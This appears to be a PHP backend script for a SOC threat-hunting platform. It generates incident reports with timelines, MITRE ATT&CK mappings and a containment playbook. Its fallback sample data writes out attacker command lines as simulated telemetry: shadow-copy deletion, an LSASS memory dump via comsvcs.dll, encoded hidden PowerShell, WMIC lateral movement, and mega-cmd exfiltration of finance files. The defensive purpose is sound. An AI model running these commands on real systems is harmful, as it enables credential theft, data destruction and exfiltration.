<?php
// =========================================================================
// API: Investigation Report & Incident Timeline Generator
// =========================================================================

require_once __DIR__ . '/../config/db.php';

$pdo = getDatabaseConnection();
$scenarioId = $_GET['scenario_id'] ?? 'SCN-APT29-GHOST';
$analystName = $_GET['analyst'] ?? 'Senior SOC Threat Hunter';

// Fetch events
$events = [];
if ($pdo) {
    $stmt = $pdo->prepare("SELECT * FROM events WHERE scenario_id = ? ORDER BY timestamp ASC");
    $stmt->execute([$scenarioId]);
    $events = $stmt->fetchAll();
}

$reportData = compileInvestigationReport($scenarioId, $events, $analystName);

sendJsonResponse([
    'status' => 'success',
    'report' => $reportData
]);

function compileInvestigationReport($scenarioId, $events, $analystName) {
    $reportId = 'IR-' . date('Ymd') . '-' . strtoupper(substr(md5($scenarioId), 0, 6));
    $generatedAt = date('Y-m-d H:i:s T');

    $scenarioNames = [
        'SCN-APT29-GHOST' => 'State-Sponsored Hybrid Enterprise Intrusion & S3 Data Exfiltration',
        'SCN-RANSOM-BLACKCAT' => 'BlackCat Double-Extortion Ransomware Campaign & Shadow Copy Purge',
        'SCN-CLOUD-CRYPTOMINE' => 'Cloud IAM Privilege Escalation & Unauthorized GPU Fleet Cryptomining'
    ];

    $title = $scenarioNames[$scenarioId] ?? 'Complex Multi-Stage Cyber Security Incident';

    $timeline = [];
    $evidenceChain = [];
    $mitreCoverage = [];

    // Fallback if no events in DB
    if (empty($events)) {
        if ($scenarioId === 'SCN-RANSOM-BLACKCAT') {
            $events = [
                ['event_uuid' => 'EVT-RSM-001', 'timestamp' => '2026-11-16 02:11:00', 'domain' => 'auth', 'event_type' => 'vpn_auth', 'severity' => 'high', 'source_host' => '194.26.29.112', 'dest_host' => 'VPN-GW-01', 'user_id' => 'svc_backup', 'command_line' => 'VPN Authentication Success after 38 failed attempts', 'mitre_tactic' => 'Initial Access', 'mitre_technique_id' => 'T1133', 'mitre_technique_name' => 'External Remote Services'],
                ['event_uuid' => 'EVT-RSM-002', 'timestamp' => '2026-11-16 02:15:32', 'domain' => 'endpoint', 'event_type' => 'rdp_login', 'severity' => 'high', 'source_host' => 'VPN-GW-01', 'dest_host' => 'SRV-FILE-01', 'user_id' => 'svc_backup', 'command_line' => 'mstsc.exe logon type 10', 'mitre_tactic' => 'Lateral Movement', 'mitre_technique_id' => 'T1021.001', 'mitre_technique_name' => 'Remote Desktop Protocol'],
                ['event_uuid' => 'EVT-RSM-004', 'timestamp' => '2026-11-16 02:35:45', 'domain' => 'endpoint', 'event_type' => 'process_creation', 'severity' => 'critical', 'source_host' => 'SRV-FILE-01', 'dest_host' => 'SRV-FILE-01', 'user_id' => 'svc_backup', 'command_line' => 'vssadmin.exe delete shadows /all /quiet', 'mitre_tactic' => 'Defense Evasion', 'mitre_technique_id' => 'T1490', 'mitre_technique_name' => 'Inhibit System Recovery'],
                ['event_uuid' => 'EVT-RSM-006', 'timestamp' => '2026-11-16 02:44:00', 'domain' => 'network', 'event_type' => 'cloud_exfil', 'severity' => 'high', 'source_host' => 'SRV-FILE-01', 'dest_host' => 'mega.nz', 'user_id' => 'svc_backup', 'command_line' => 'mega-cmd.exe put C:\\Shares\\Finance\\*.xlsx /BlackCat_Exfil/', 'mitre_tactic' => 'Exfiltration', 'mitre_technique_id' => 'T1567.002', 'mitre_technique_name' => 'Exfiltration to Cloud Storage'],
                ['event_uuid' => 'EVT-RSM-007', 'timestamp' => '2026-11-16 02:50:12', 'domain' => 'endpoint', 'event_type' => 'file_encryption', 'severity' => 'critical', 'source_host' => 'SRV-FILE-01', 'dest_host' => 'SRV-FILE-01', 'user_id' => 'svc_backup', 'command_line' => 'encryptor.exe --path C:\\Shares --threads 32 --note HOW_TO_RESTORE.txt', 'mitre_tactic' => 'Impact', 'mitre_technique_id' => 'T1486', 'mitre_technique_name' => 'Data Encrypted for Impact']
            ];
        } else {
            $events = [
                ['event_uuid' => 'EVT-APT-001', 'timestamp' => '2026-11-16 08:14:22', 'domain' => 'endpoint', 'event_type' => 'process_creation', 'severity' => 'medium', 'source_host' => 'WKSTN-FIN-04', 'dest_host' => 'WKSTN-FIN-04', 'user_id' => 'sarah.connor', 'command_line' => 'winword.exe /n "Q4_Executive_Bonus_Matrix.docm"', 'mitre_tactic' => 'Initial Access', 'mitre_technique_id' => 'T1566.001', 'mitre_technique_name' => 'Spearphishing Attachment'],
                ['event_uuid' => 'EVT-APT-002', 'timestamp' => '2026-11-16 08:14:25', 'domain' => 'endpoint', 'event_type' => 'process_creation', 'severity' => 'high', 'source_host' => 'WKSTN-FIN-04', 'dest_host' => 'WKSTN-FIN-04', 'user_id' => 'sarah.connor', 'command_line' => 'powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAo...', 'mitre_tactic' => 'Execution', 'mitre_technique_id' => 'T1059.001', 'mitre_technique_name' => 'PowerShell Execution'],
                ['event_uuid' => 'EVT-APT-004', 'timestamp' => '2026-11-16 08:22:05', 'domain' => 'endpoint', 'event_type' => 'process_creation', 'severity' => 'critical', 'source_host' => 'WKSTN-FIN-04', 'dest_host' => 'WKSTN-FIN-04', 'user_id' => 'sarah.connor', 'command_line' => 'rundll32.exe comsvcs.dll, MiniDump 724 C:\\Users\\Public\\lsass.dmp full', 'mitre_tactic' => 'Credential Access', 'mitre_technique_id' => 'T1003.001', 'mitre_technique_name' => 'LSASS Memory Dumping'],
                ['event_uuid' => 'EVT-APT-006', 'timestamp' => '2026-11-16 08:41:15', 'domain' => 'endpoint', 'event_type' => 'process_creation', 'severity' => 'critical', 'source_host' => 'WKSTN-FIN-04', 'dest_host' => 'DC01.corp.local', 'user_id' => 'svc_sqladmin', 'command_line' => 'wmic.exe /node:10.0.0.5 process call create "stage2.exe"', 'mitre_tactic' => 'Lateral Movement', 'mitre_technique_id' => 'T1047', 'mitre_technique_name' => 'Windows Management Instrumentation'],
                ['event_uuid' => 'EVT-APT-009', 'timestamp' => '2026-11-16 09:12:44', 'domain' => 'cloud', 'event_type' => 'aws_api_call', 'severity' => 'critical', 'source_host' => 'AWS Cloud', 'dest_host' => 'AWS S3', 'user_id' => 'ProductionDataOpsRole', 'command_line' => 'S3::GetObject bucket=corp-prod-financial-snapshots (1.49 GB)', 'mitre_tactic' => 'Collection', 'mitre_technique_id' => 'T1530', 'mitre_technique_name' => 'Data from Cloud Storage'],
                ['event_uuid' => 'EVT-APT-010', 'timestamp' => '2026-11-16 09:20:00', 'domain' => 'network', 'event_type' => 'data_exfiltration', 'severity' => 'critical', 'source_host' => 'AWS-Egress', 'dest_host' => '91.240.118.12', 'user_id' => 'ProductionDataOpsRole', 'command_line' => 'HTTPS outbound transfer 1.54 GB to CH IP 91.240.118.12', 'mitre_tactic' => 'Exfiltration', 'mitre_technique_id' => 'T1048', 'mitre_technique_name' => 'Exfiltration Over Alternative Protocol']
            ];
        }
    }

    foreach ($events as $evt) {
        $timeline[] = [
            'timestamp' => $evt['timestamp'],
            'event_uuid' => $evt['event_uuid'],
            'domain' => strtoupper($evt['domain']),
            'event_type' => $evt['event_type'],
            'severity' => $evt['severity'],
            'source' => $evt['source_host'] ?: ($evt['source_ip'] ?? 'N/A'),
            'target' => $evt['dest_host'] ?: ($evt['dest_ip'] ?? 'N/A'),
            'user' => $evt['user_id'] ?: 'System',
            'action' => $evt['command_line'] ?: ($evt['cloud_action'] ?? $evt['event_type']),
            'mitre_technique' => $evt['mitre_technique_id'] ? "{$evt['mitre_technique_id']} - {$evt['mitre_technique_name']}" : 'N/A'
        ];

        $evidenceChain[] = [
            'item_id' => $evt['event_uuid'],
            'timestamp' => $evt['timestamp'],
            'evidence_type' => $evt['domain'] . ' Telemetry Log',
            'actor_entity' => $evt['user_id'] . '@' . ($evt['source_host'] ?: $evt['source_ip']),
            'raw_indicator' => $evt['command_line'] ?: ($evt['event_type']),
            'custody_status' => 'Verified & Indexed'
        ];

        if (!empty($evt['mitre_technique_id'])) {
            $mitreCoverage[$evt['mitre_technique_id']] = [
                'id' => $evt['mitre_technique_id'],
                'name' => $evt['mitre_technique_name'],
                'tactic' => $evt['mitre_tactic'],
                'severity' => $evt['severity']
            ];
        }
    }

    $containmentPlaybook = [
        'Phase 1: Immediate Threat Isolation' => [
            'Sever network connection on infected endpoints (isolate via EDR agent).',
            'Null-route identified external C2 IP addresses on perimeter firewalls.',
            'Terminate rogue interactive sessions (RDP/SSH/VPN).'
        ],
        'Phase 2: Identity & Credential Invalidation' => [
            'Force password rotation for all affected domain and service accounts.',
            'Perform double Kerberos krbtgt ticket-granting password resets.',
            'Revoke active AWS STS tokens, IAM access keys, and active web sessions.'
        ],
        'Phase 3: Root Cause Eradication & Recovery' => [
            'Re-image compromised endpoints from certified golden baselines.',
            'Restore locked or altered datastores from offline air-gapped backups.',
            'Deploy targeted Sigma and YARA correlation rules to continuously monitor for recurrence.'
        ]
    ];

    return [
        'report_id' => $reportId,
        'title' => $title,
        'scenario_id' => $scenarioId,
        'classification' => 'RESTRICTED // SOC-OPERATIONS',
        'lead_analyst' => $analystName,
        'generated_at' => $generatedAt,
        'executive_summary' => "On {$generatedAt}, the SOC Threat Hunting Platform reconstructed a high-severity, multi-stage cyber intrusion. The threat actor traversed multiple security boundaries (Endpoint, Identity/Active Directory, Perimeter Network, and Cloud Infrastructure). Telemetry correlation confirmed malicious progression from Initial Access through lateral traversal to ultimate data collection and impact. A confidence rating of 95% was computed based on cross-domain entity convergence.",
        'timeline' => $timeline,
        'mitre_coverage' => array_values($mitreCoverage),
        'evidence_chain' => $evidenceChain,
        'containment_playbook' => $containmentPlaybook
    ];
}
